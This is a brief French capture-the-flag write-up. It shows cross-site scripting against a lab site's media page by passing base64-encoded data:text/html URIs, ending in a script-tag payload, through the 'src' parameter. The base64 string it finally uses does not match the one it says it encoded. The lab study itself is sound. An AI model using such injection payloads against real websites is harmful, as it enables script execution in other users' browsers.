Context:

Le cross-site scripting (XSS) est une tactique par laquelle un acteur malveillant injecte du code malveillant via un ou plusieurs scripts web dans un site web ou une web application légitime.
Sur /index.php?page=media&src=nsa, le paramètre src sert de “source” pour charger un contenu (média).
L’idée est de voir si on peut lui faire charger autre chose qu’une ressource prévue.

Tests effectués:

On test une Data URI, c’est une “URL” qui contient directement le contenu. Classique
Par exemple :
data:text/html,<h1>hello</h1>
 ou data:text/plain,hello
et on voit un hello qui s'affiche, donc le html est accepte

Base64 :Le HTML brut dans une URL peut casser (caractères spéciaux, encodage, filtrage).
En base64, la chaîne devient stable (caractères simples), donc plus fiable pour tester.

on encode : echo -n '<h1>HELLO</h1>' | base64
pon trouve PGgxPkhFTExPPC9oMT4=
donc on peut tester : data:text/html;base64,PGgxPkhFTExPPC9oMT4=

doooonc, vu que ca fonctionne, on peut tenter d'injecter un script :
echo -n '<script>test</script>' | base64
on recupere PHNjcmlwdD50ZXN0PC9zY3JpcHQ+
donc dans l'URL on met : src=data:text/html;base64,PHNjcmlwdD5hbGVydDwvc2NyaXB0Pg== et on obtient le flag

